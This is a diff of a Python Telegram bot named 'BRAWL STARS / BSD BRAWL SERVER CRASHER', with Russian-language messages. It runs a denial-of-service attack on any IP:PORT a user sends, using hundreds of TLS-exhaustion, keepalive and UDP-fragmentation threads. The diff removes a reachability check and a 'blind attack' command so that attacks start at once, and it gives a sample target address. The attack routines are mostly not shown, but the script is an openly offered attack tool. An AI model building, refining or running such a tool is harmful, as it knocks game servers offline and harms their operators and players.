@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
-BRAWL STARS / BSD BRAWL SERVER CRASHER — PYTHON 3.14
+BRAWL STARS / BSD BRAWL SERVER CRASHER
+IP:PORT -> АТАКА | stop -> ОСТАНОВКА
 """
 import socket
 import struct
@@ -10,7 +11,6 @@ import time
 import re
 import os
 import logging
-import requests
 from flask import Flask, request
 import telebot
 from telebot import types
@@ -22,38 +22,11 @@ BUFFER_OVERFLOW_THREADS = 100
 KEEPALIVE_THREADS = 150
 UDP_FRAG_THREADS = 100
 
-SUPERCELL_PORTS = [9339, 9443, 8443, 5000, 5001, 5005, 5010, 5100]
-
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
 active_attacks = {}
-
-def check_target(ip, port):
-    try:
-        socket.inet_aton(ip)
-    except socket.error:
-        return False, "Невалидный IP адрес"
-    for test_port in [port] + SUPERCELL_PORTS[:5]:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            result = sock.connect_ex((ip, test_port))
-            sock.close()
-            if result == 0:
-                return True, f"Порт {test_port} открыт"
-            elif result == 111:
-                return True, f"Порт {test_port} закрыт | RST получен"
-        except:
-            continue
-    for scheme in ('http', 'https'):
-        try:
-            r = requests.head(f"{scheme}://{ip}:{port}/", timeout=3, headers={"User-Agent": "Mozilla/5.0"})
-            return True, f"HTTP {r.status_code}"
-        except:
-            pass
-    return False, "Цель недоступна"
 
 def tls_exhaustion_attack(ip, port, stop_flag):
     while not stop_flag.is_set():
@@ -152,68 +125,32 @@ def stop_cmd(m):
     cid = m.chat.id
     if cid in active_attacks:
         active_attacks[cid].stop()
-        bot.reply_to(m, "🛑 Атака остановлена")
+        bot.reply_to(m, "Атака остановлена")
         del active_attacks[cid]
     else:
-        bot.reply_to(m, "💤 Нет активной атаки")
-
-@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('!blind'))
-def blind_cmd(m):
-    cid = m.chat.id
-    parts = m.text.split()
-    if len(parts) < 2:
-        bot.reply_to(m, "❌ !blind IP:PORT")
-        return
-    ip, port = parse_target(parts[1])
-    if not ip:
-        bot.reply_to(m, "❌ Неверный IP")
-        return
-    if cid in active_attacks:
-        bot.reply_to(m, "⚠️ Атака уже идёт")
-        return
-    if not port:
-        port = 9339
-    def launch():
-        alive, msg = check_target(ip, port)
-        if not alive:
-            bot.send_message(cid, f"⚠️ Цель не отвечает: {msg}\nСлепая атака...")
-        else:
-            bot.send_message(cid, f"✅ {msg}\nЗапуск...")
-        a = Attack(ip, port)
-        a.start()
-        active_attacks[cid] = a
-        total = TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS
-        bot.send_message(cid, f"💀 АТАКА\n🎯 {ip}:{port}\n🔴 {total} потоков\nstop - остановка")
-    threading.Thread(target=launch, daemon=True).start()
+        bot.reply_to(m, "Нет активной атаки")
 
 @bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
 def attack_cmd(m):
     cid = m.chat.id
     ip, port = parse_target(m.text)
     if not ip:
-        bot.reply_to(m, "❌ Неверный IP")
+        bot.reply_to(m, "Неверный IP")
         return
     if cid in active_attacks:
-        bot.reply_to(m, "⚠️ Атака уже идёт")
+        bot.reply_to(m, "Атака уже идет! stop - остановка")
         return
     if not port:
         port = 9339
-    status_msg = bot.reply_to(m, f"🔍 Проверка {ip}:{port}...")
-    def verify_and_launch():
-        alive, msg = check_target(ip, port)
-        total = TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS
-        if alive:
-            a = Attack(ip, port)
-            a.start()
-            active_attacks[cid] = a
-            bot.edit_message_text(f"✅ {msg}\n💀 АТАКА\n🎯 {ip}:{port}\n🔴 {total} потоков\nstop - остановка", chat_id=cid, message_id=status_msg.message_id)
-        else:
-            bot.edit_message_text(f"❌ {msg}\n💡 !blind {ip}:{port} для слепой атаки", chat_id=cid, message_id=status_msg.message_id)
-    threading.Thread(target=verify_and_launch, daemon=True).start()
+    a = Attack(ip, port)
+    a.start()
+    active_attacks[cid] = a
+    total = TLS_HANDSHAKE_THREADS + BUFFER_OVERFLOW_THREADS + KEEPALIVE_THREADS + UDP_FRAG_THREADS
+    bot.reply_to(m, f"АТАКА ЗАПУЩЕНА\n{ip}:{port}\nПотоков: {total}\nstop - остановка")
 
 @bot.message_handler(func=lambda m: True)
 def unknown(m):
-    bot.reply_to(m, "🎮 BS CRASHER\nIP:PORT — атака\n!blind IP:PORT — без проверки\nstop — стоп")
+    bot.reply_to(m, "Отправь IP:PORT\nПример: 34.240.15.100:9339\nstop - остановка")
 
 @app.route(f'/webhook/{BOT_TOKEN}', methods=['POST', 'GET'])
 def webhook():
@@ -236,4 +173,4 @@ if __name__ == "__main__":
     time.sleep(0.5)
     bot.set_webhook(url=f"{RENDER_URL}/webhook/{BOT_TOKEN}")
     port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port, debug=False) 
+    app.run(host="0.0.0.0", port=port, debug=False)
